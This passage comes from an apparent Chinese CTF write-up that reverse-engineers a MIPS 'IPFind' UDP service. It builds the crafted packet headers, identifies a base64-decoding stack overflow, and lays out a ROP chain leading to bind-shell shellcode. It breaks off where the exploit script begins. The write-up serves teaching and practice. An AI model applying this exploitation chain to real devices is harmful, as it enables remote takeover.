&#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> ( *_errno_location() != <span class="number">4</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                sub_402198(ifname);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                sub_4013D0(<span class="string">&quot;bind port(%d) error\n&quot;</span>, <span class="number">62720</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              sub_4013D0(<span class="string">&quot;setsockopt SO_REUSEADDR failed\n&quot;</span>);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            sub_4013D0(<span class="string">&quot;setsockopt SO_BROADCAST failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          sub_4013D0(<span class="string">&quot;setsockopt SO_BINDTODEVICE failed\n&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_4013D0(<span class="string">&quot;Invaild ifname\n&quot;</span>, argv, envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数的报错信息可以帮助我们很好的理解这个程序在做什么</p><p>首先是根据网络接口名称打开一个<code>/var/run/</code>目录下的文件,要求能够正确打开文件</p><p>然后注册信号处理函数并创建创建一个udp的socket</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v12.sa_family = <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v12.sa_data[<span class="number">2</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">      *v12.sa_data = <span class="number">62720</span>;</span><br><span class="line">      <span class="built_in">strncpy</span>(v13, ifname, <span class="number">0x10</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">25</span>, v13, <span class="number">0x20</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">32</span>, &amp;v9, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">4</span>, &amp;v10, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( bind(server_sockfd, &amp;v12, <span class="number">0x10</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br></pre></td></tr></table></figure><p>sa_family为2代表是udp，sa_data=62720则代表要绑定到62720端口上</p><p>如果绑定成功就到了最核心的地方</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">sub_4013D0(<span class="string">&quot;IPFind start(%s)...\n&quot;</span>, ifname);</span><br><span class="line">                v18 = user_data;</span><br><span class="line">                v21 = &amp;user_data[<span class="number">17</span>];</span><br><span class="line">                addr_len = &amp;v11;</span><br><span class="line">                v20 = <span class="string">&quot;FIVI&quot;</span>;</span><br><span class="line">                v22 = &amp;v16;</span><br><span class="line">                v23 = &amp;unk_402E90;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v5 = &amp;v14;</span><br><span class="line">                  <span class="keyword">if</span> ( dword_413168 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">do</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    *v5 = <span class="number">0</span>;</span><br><span class="line">                    v5 += <span class="number">4</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">while</span> ( v5 != user_data );</span><br><span class="line">                  v6 = server_sockfd;</span><br><span class="line">                  v14.__fds_bits[server_sockfd &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; server_sockfd;</span><br><span class="line">                  <span class="keyword">if</span> ( select(v6 + <span class="number">1</span>, &amp;v14, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( ((v14.__fds_bits[server_sockfd &gt;&gt; <span class="number">5</span>] &gt;&gt; server_sockfd) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v11 = <span class="number">16</span>;</span><br><span class="line">                      <span class="built_in">memset</span>(user_data, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">                      recvfrom(server_sockfd, user_data, <span class="number">0x800</span>u, <span class="number">0</span>, &amp;client_addr, addr_len);</span><br><span class="line">                      *&amp;user_data[<span class="number">4</span>] = (*&amp;user_data[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | user_data[<span class="number">4</span>] | ((*&amp;user_data[<span class="number">4</span>] &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((*&amp;user_data[<span class="number">4</span>] &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                      v7 = ((_byteswap_ushort(*&amp;user_data[<span class="number">9</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">10</span>] | (user_data[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">                      *&amp;user_data[<span class="number">9</span>] = v7;</span><br><span class="line">                      *&amp;user_data[<span class="number">11</span>] = (_byteswap_ushort(*&amp;user_data[<span class="number">11</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">12</span>] | (user_data[<span class="number">11</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">                      v8 = ((_byteswap_ushort(*&amp;user_data[<span class="number">23</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">24</span>] | (user_data[<span class="number">23</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">                      *&amp;user_data[<span class="number">23</span>] = v8;</span><br><span class="line">                      v17 = (*&amp;user_data[<span class="number">25</span>] &lt;&lt; <span class="number">24</span>) | user_data[<span class="number">25</span>] | ((*&amp;user_data[<span class="number">25</span>] &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((*&amp;user_data[<span class="number">25</span>] &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                      *&amp;user_data[<span class="number">25</span>] = v17;</span><br><span class="line">                      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v18, v20, <span class="number">4u</span>) &amp;&amp; user_data[<span class="number">8</span>] == <span class="number">10</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          <span class="keyword">if</span> ( !v8 &amp;&amp; !<span class="built_in">memcmp</span>(v21, v23, <span class="number">6u</span>) &amp;&amp; !v17 )</span><br><span class="line">                            sub_40172C(user_data);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span></span><br><span class="line">                               &amp;&amp; net_get_hwaddr(ifname, v22) &gt;= <span class="number">0</span></span><br><span class="line">                               &amp;&amp; !<span class="built_in">memcmp</span>(v21, v22, <span class="number">6u</span>)</span><br><span class="line">                               &amp;&amp; *&amp;user_data[<span class="number">25</span>] == <span class="number">142</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          sub_4013F4(user_data, <span class="number">142</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure><p>我们的目标显然要是进入<code>sub_40172c</code>函数,分析一下流程</p><p>其首先会接受最大0x800长度的数据,那么需要满足的条件就是</p><ol><li><p><code>!strncmp(v18, v20, 4u)</code>v18和v20要相等，v20是<code>FIVI</code>，v18是<code>user_data</code>起始的数据，所以第一步<code>user_data = &#39;FIVI&#39;</code></p></li><li><p><code>user_data[8] == 10</code>,第9个数要为<code>&#39;\n&#39;</code>，所以<code>user_data = &#39;FIVI&#39; + &#39;\x00\x00\x00\x00&#39; + &#39;\n&#39;</code></p></li><li><p><code>v7 == 1</code>需要满足下式为1</p><p><code>v7 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)((char *)&amp;v15[2] + 1)) &lt;&lt; 8) | ((unsigned int)(BYTE2(v15[2]) | (BYTE1(v15[2]) &lt;&lt; 8)) &gt;&gt; 8));</code></p><p>当user_data[9] = 0x1，user_data[10] = 0的时候满足这个条件</p></li><li><p><code>!memcmp(v21, v23, 6u)</code>,v21和v23要相等，v23是<code>0xff * 6</code>，这里其实就是mac_addr</p></li><li><p><code>!v8</code>,v8要为0</p><p>即下式为0<code>v8 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)((char *)&amp;v15[5] + 3)) &lt;&lt; 8) | ((unsigned int)(HIBYTE(v15[6]) | (LOBYTE(v15[5]) &lt;&lt; 8)) &gt;&gt; 8));</code></p></li><li><p><code>!v17</code>,v17要为0,即<code>v17 = (*(_DWORD *)((char *)&amp;v15[6] + 1) &lt;&lt; 24) | HIBYTE(*(_DWORD *)((char *)&amp;v15[6] + 1)) | ((*(_DWORD *)((char *)&amp;v15[6] + 1) &amp; 0xFF0000u) &gt;&gt; 8) | ((*(_DWORD *)((char *)&amp;v15[6] + 1) &amp; 0xFF00) &lt;&lt; 8);</code>要为0</p></li></ol><p>综上,进入<code>sub_40172c</code>的报头是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="string">b&#x27;FIVI&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x01\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">6</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>继续分析40172c函数,这个函数会获取设备的基本信息,其中便包括mac地址</p><p>对比patch前后,差别在于原版本中有这么一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v3 = inet_ntoa((<span class="keyword">struct</span> in_addr)dword_413174);</span><br><span class="line">dword_413174 = inet_addr(<span class="string">&quot;255.255.255.255&quot;</span>);</span><br></pre></td></tr></table></figure><p>使得<code>dword_413174</code>被赋值了,但在之前的主函数我们看到,这个全局变量如果不为0,皆会直接退出</p><p>也就是使得这个函数不可被执行第二次,而现在其被patch了,那么也就是说main函数可以被访问多次</p><p>根据这一点我们可以猜想出题人应该是希望再一次执行main函数进入另一个分支的,也就是<code>sub_4013F4</code></p><p>重复之前的分析流程,可以知道进入这个分支的条件是,mac就来自于之前接收到的mac地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">b&#x27;FIVI&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x02\x00&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p2 += mac</span><br><span class="line">p2 += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x8E&#x27;</span></span><br></pre></td></tr></table></figure><p>漏洞点发生在<code>400f50</code>这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400F50</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> Group; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> Pass; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+18h] [-344h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [sp+118h] [-244h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">256</span>]; <span class="comment">// [sp+218h] [-144h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">68</span>]; <span class="comment">// [sp+318h] [-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  Base64decs(a1, v6);</span><br><span class="line">  Base64decs(a2, v7);</span><br><span class="line">  cfgRead(<span class="string">&quot;USER_ADMIN&quot;</span>, <span class="string">&quot;Username1&quot;</span>, v9);</span><br><span class="line">  usrInit(<span class="number">0</span>);</span><br><span class="line">  Group = usrGetGroup(v6);</span><br><span class="line">  Pass = usrGetPass(v6, v8, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Pass == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !Group &amp;&amp; !<span class="built_in">strcmp</span>(v9, v6) )</span><br><span class="line">      Pass = <span class="built_in">strcmp</span>(v7, v8) != <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Pass = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  usrFree();</span><br><span class="line">  <span class="keyword">return</span> Pass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在第二个<code>Base64decs(a2, v7);</code>中，会对a2进行base64解码，然后将解码之后的数据存到v7中，a2 = p2 + 0x5d，也就是0x5d后面的数据会进行base64decode到v7中，p2可控，这就造成了栈溢出漏洞</p><p>那么就可以开始利用了,选择ret2shellcode,程序虽然没有任何保护机制,aslr应该也是关闭的,不过就算不变我们也没办法获得,所以需要想办法在ipfind中寻找gadget</p><p>在跳转之前需要注意一个gp寄存器，gp寄存器它的值被用来定位静态数据区域，所以要保证gp寄存器不会出错</p><p>以strcmp函数为例,在ida中按住<code>alt+G</code>切换到gp,就能看到</p><p><code>.text:00401040 8F 99 80 64                   lw      $t9, (strcmp_ptr - 0x41B030)($gp)</code></p><p>结合</p><p><code>.got:00413094 00 41 31 CC                   strcmp_ptr:.word strcmp</code></p><p>得到gp应该为<code>7f9c+413094=41b030</code>,这个是固定的</p><p>下面这个gadgets执行完毕之后会调用close清空a0, a1, a2，为得是不影响后一个gadgets的使用，并且可以控制gp和ra</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)</span><br><span class="line">.text:004020A8 8F 99 80 38                   la      $t9, close</span><br><span class="line">.text:004020AC 03 20 F8 09                   jalr    $t9 ; close</span><br><span class="line">.text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd</span><br><span class="line">.text:004020B0</span><br><span class="line">.text:004020B4</span><br><span class="line">.text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j</span><br><span class="line">.text:004020B4                                                                        # sub_401DF4+238↑j</span><br><span class="line">.text:004020B4                                                                        # sub_401DF4+284↑j</span><br><span class="line">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span><br><span class="line">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span><br><span class="line">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span><br><span class="line">.text:004020C0 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span><br></pre></td></tr></table></figure><p>接着控制ra为下一个gadgets的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:00401F98 0C 10 04 F4                   jal     my_puts</span><br><span class="line">.text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # &quot;Can&#x27;t get hello socket\n&quot;</span><br><span class="line">.text:00401F9C</span><br><span class="line">.text:00401FA0 10 00 00 44                   b       loc_4020B4</span><br><span class="line">.text:00401FA4 00 00 00 00                   nop</span><br><span class="line"></span><br><span class="line">my_puts</span><br><span class="line">.text:004013D0 addiu   $sp, -0x10</span><br><span class="line">.text:004013D4 sw      $a1, 0x10+arg_4($sp)</span><br><span class="line">.text:004013D8 sw      $a2, 0x10+arg_8($sp)</span><br><span class="line">.text:004013DC sw      $a3, 0x10+arg_C($sp)</span><br><span class="line">.text:004013E0 addiu   $v0, $sp, 0x10+arg_4</span><br><span class="line">.text:004013E4 sw      $v0, 0x10+var_8($sp)</span><br><span class="line">.text:004013E8 addiu   $sp, 0x10</span><br><span class="line">.text:004013EC jr      $ra</span><br><span class="line">.text:004013F0 nop</span><br><span class="line"></span><br><span class="line">loc_4020B4</span><br><span class="line">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span><br><span class="line">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span><br><span class="line">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span><br><span class="line">.text:004020C0 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span><br></pre></td></tr></table></figure><p>上面这个gadgets详细说一下，首先是进入my_puts这里</p><p>这里<code>addiu $v0, $sp, 0x10+arg_4</code>把栈上的地址给存到了v0中，然后又把v0的值放到了sp + 0x8这里</p><p>在4020b4中可以控制s0，这里把s0控制成<code>0x00413200 - 0xd</code>，这是因为下面的gadgets需要用到</p><p>然后又到了<code>loc_4020B4</code>这里，这里可以控制$ra，那么就可以继续ROP下去，接着到<code>0x00400C9C</code>这里的gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20</span><br></pre></td></tr></table></figure><p>恢复GP，然后控制ra到<code>0x00400F28</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)</span><br><span class="line">.text:00400F28</span><br><span class="line">.text:00400F2C</span><br><span class="line">.text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j</span><br><span class="line">.text:00400F2C 8F 82 80 68                   la      $v0, ifname</span><br><span class="line">.text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)</span><br><span class="line">.text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr</span><br><span class="line">.text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr</span><br><span class="line">.text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11</span><br><span class="line">.text:00400F3C</span><br><span class="line">.text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)</span><br><span class="line">.text:00400F48 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28</span><br></pre></td></tr></table></figure><p>然后这里就需要用到上面的把s0控制成<code>0x00413200 - 0xd</code>，在<code>sw $v0, 0xD($s0)</code>这里是把v0的值放到s0 + 0xd这个位置，这个位置是<code>0x413200</code>是net_get_dns，这样的话net_get_dns这里就是v0，就是栈上的地址了，如果调用net_get_dns的时候就会调用栈上的地址</p><p>在gadgets的最后可以控制s0和ra，控制s0为net_get_dns的值也就是栈上的地址，控制ra为<code>0x004027C8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:004027C8 lw      $t9, 0($s0)</span><br><span class="line">.text:004027CC bne     $t9, $s1, loc_4027C0</span><br><span class="line">.text:004027D0 addiu   $s0, -4</span><br><span class="line">.text:004027D0</span><br><span class="line">.text:004027D4 lw      $ra, 0x1C+var_s8($sp)</span><br><span class="line">.text:004027D8 lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004027DC lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004027E0 jr      $ra</span><br><span class="line">.text:004027E4 addiu   $sp, 0x28</span><br></pre></td></tr></table></figure><p>把栈上的地址放到t9中，会跳到loc_4027C0中执行<code>jalr $t9</code>，执行栈地址上的东西</p><p>shellcode可以采用udp_bind_shell</p><p>但是在调试的时候会发现跳不到shellcode上，所以在上面的一个地方加上一个跳转指令</p><p><strong>exp如下</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span 